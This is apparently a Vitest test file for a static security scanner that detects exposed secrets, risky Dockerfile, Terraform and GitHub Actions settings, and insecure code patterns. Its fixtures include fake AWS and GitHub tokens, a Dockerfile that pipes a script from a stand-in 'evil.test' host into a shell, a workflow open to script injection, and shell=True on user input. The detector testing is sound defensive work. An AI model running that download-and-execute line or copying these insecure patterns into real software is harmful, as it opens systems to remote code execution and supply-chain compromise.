import { describe, expect, it, vi } from 'vitest';
import { AnalyzeStaticUseCase } from '../application/analyze-static.use-case';
import { GitHubApiRepositoryFetcher } from '../infrastructure/github/github-api-repository.fetcher';
import { IacCicdAnalyzer } from '../infrastructure/static-analysis/iac-cicd.analyzer';
import { LightweightSastAnalyzer } from '../infrastructure/static-analysis/lightweight-sast.analyzer';
import {
  SecretScannerAnalyzer,
  maskSecretMatch,
} from '../infrastructure/static-analysis/secret-scanner.analyzer';

describe('Static Analysis Suite (Secrets, IaC/CI-CD, Lightweight SAST & Repo Posture)', () => {
  it('detects exposed secrets and NEVER returns plaintext secret values in maskedSnippet or description', async () => {
    const awsKey = 'AKIA9X8W7V6U5T4S3R2Q';
    const ghToken = 'ghp_9x8w7v6u5t4s3r2q1p0o9n8m7l6k5j4i3h2g';
    const analyzer = new SecretScannerAnalyzer();

    const findings = await analyzer.analyze([
      {
        path: 'src/config/keys.ts',
        content: `
          export const aws = "${awsKey}";
          export const gh = "${ghToken}";
          export const demo = "example_placeholder_key_value";
        `,
      },
      {
        path: '.env.production',
        content: 'SECRET=super_real_secret_token_9x8w7v',
      },
      {
        path: '.env.example',
        content: `AWS_ACCESS_KEY_ID=${awsKey}`,
      },
    ]);

    expect(findings.length).toBeGreaterThanOrEqual(3);
    const serialized = JSON.stringify(findings);
    expect(serialized).not.toContain(awsKey);
    expect(serialized).not.toContain(ghToken);
    expect(serialized).not.toContain('super_real_secret_token_9x8w7v');
    expect(maskSecretMatch(awsKey)).toBe('AKIA****3R2Q');
  });

  it('detects CIS Dockerfile, Terraform, Kubernetes, and GitHub Actions supply-chain risks', async () => {
    const analyzer = new IacCicdAnalyzer();

    const findings = await analyzer.analyze([
      {
        path: 'Dockerfile',
        content: 'FROM node:latest\nRUN curl -fsSL https://evil.test/install.sh | sh\n',
      },
      {
        path: 'infra/main.tf',
        content: 'resource "aws_security_group" "web" {\n  cidr_blocks = ["0.0.0.0/0"]\n  encrypted = false\n}\n',
      },
      {
        path: '.github/workflows/ci.yml',
        content: `
on: pull_request_target
permissions: write-all
jobs:
  build:
    steps:
      - uses: thirdparty/action@v1
      - run: echo "\${{ github.event.issue.title }}"
`,
      },
    ]);

    const ruleIds = findings.map((f) => f.ruleId);
    expect(ruleIds).toContain('iac:dockerfile-latest-tag');
    expect(ruleIds).toContain('iac:dockerfile-root-user');
    expect(ruleIds).toContain('iac:dockerfile-pipe-to-shell');
    expect(ruleIds).toContain('iac:terraform-open-cidr');
    expect(ruleIds).toContain('iac:terraform-storage-exposure');
    expect(ruleIds).toContain('cicd:gha-pull-request-target');
    expect(ruleIds).toContain('cicd:gha-write-all');
    expect(ruleIds).toContain('cicd:gha-unpinned-third-party-action');
    expect(ruleIds).toContain('cicd:gha-script-injection');
  });

  it('detects SAST patterns in JS/TS and Python while ignoring commented lines', async () => {
    const analyzer = new LightweightSastAnalyzer();

    const findings = await analyzer.analyze([
      {
        path: 'src/server/handler.ts',
        content: `
// eval(userInput) - commented out example must not trigger
/* dangerouslySetInnerHTML ignored inside block comment */
const html = { dangerouslySetInnerHTML: { __html: input } };
const agent = { rejectUnauthorized: false };
`,
      },
      {
        path: 'worker/run.py',
        content: `
# subprocess.run(cmd, shell=True)
import subprocess
subprocess.run(user_cmd, shell=True)
`,
      },
    ]);

    const ruleIds = findings.map((f) => f.ruleId);
    expect(ruleIds).toContain('sast:react-dangerously-set-inner-html');
    expect(ruleIds).toContain('sast:tls-verification-disabled');
    expect(ruleIds).toContain('sast:python-shell-exec');
    expect(ruleIds).not.toContain('sast:dynamic-code-exec');
  });

  it('evaluates repository posture signals via AnalyzeStaticUseCase + GitHubApiRepositoryFetcher', async () => {
    const fetcher = new GitHubApiRepositoryFetcher();
    const fetchSpy = vi
      .spyOn(globalThis, 'fetch')
      .mockImplementation(async (url) => {
        const u = String(url);
        if (u.includes('/git/trees/')) {
          return new Response(
            JSON.stringify({
              tree: [
                { path: 'Dockerfile', type: 'blob', size: 80, sha: 'sha-df' },
                { path: 'node_modules/x/index.js', type: 'blob', size: 80, sha: 'sha-nm' },
              ],
            }),
            { status: 200 },
          );
        }
        if (u.includes('/branches/main/protection')) {
          return new Response('Not Found', { status: 404 });
        }
        if (u.includes('/git/blobs/sha-df')) {
          return new Response(
            JSON.stringify({
              content: Buffer.from('FROM node:22-alpine\nUSER node\n').toString('base64'),
              encoding: 'base64',
            }),
            { status: 200 },
          );
        }
        return new Response('Not found', { status: 404 });
      });

    try {
      const useCase = new AnalyzeStaticUseCase(
        [fetcher],
        [
          new SecretScannerAnalyzer(),
          new IacCicdAnalyzer(),
          new LightweightSastAnalyzer(),
        ],
      );
      const output = await useCase.execute({
        repositoryUrl: 'https://github.com/acme/sample-repo',
        branch: 'main',
        accessToken: 'gho_123',
      });

      expect(output.inspectedFilesCount).toBe(1);
      const rules = output.staticFindings.map((f) => f.ruleId);
      expect(rules).toContain('posture:missing-security-md');
      expect(rules).toContain('posture:missing-dependency-automation');
      expect(rules).toContain('posture:unprotected-default-branch');
    } finally {
      fetchSpy.mockRestore();
    }
  });
});
